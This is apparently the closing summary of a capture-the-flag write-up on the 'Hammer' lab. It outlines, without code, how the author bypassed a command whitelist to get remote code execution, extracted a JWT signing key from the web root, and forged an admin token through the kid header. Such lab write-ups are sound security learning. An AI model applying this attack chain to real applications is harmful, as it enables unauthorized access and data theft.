<em>Figure: Dashboard interface showing the final system flag.</em> </div>

🔒 Final Security Assessment: Hammer Laboratory
The compromise of the Hammer laboratory demonstrated a complete exploitation chain:

🔬 Attack Pillar 1: Reconnaissance & Fuzzing
Automated bypass of the command whitelist on /execute_command.php. While the system was hardened against common injections, the permitted ls command provided the necessary directory traversal foothold.

📂 Attack Pillar 2: Exfiltration via RCE
Leveraged the RCE to locate and extract the signing key REDACTED.key. This confirmed that sensitive configuration files were improperly stored within the web root.

🔑 Attack Pillar 3: Broken Authentication
Forged a custom JWT using the HS256 algorithm. The vulnerability in the kid header allowed for a total identity hijacking by elevating the user role to admin.

💥 Business Impact
This chain of vulnerabilities resulted in the total compromise of the application and the underlying server infrastructure, allowing for full data exfiltration and unauthorized system control.

> PWNED! 🚩
By Hirt, Nelson


  




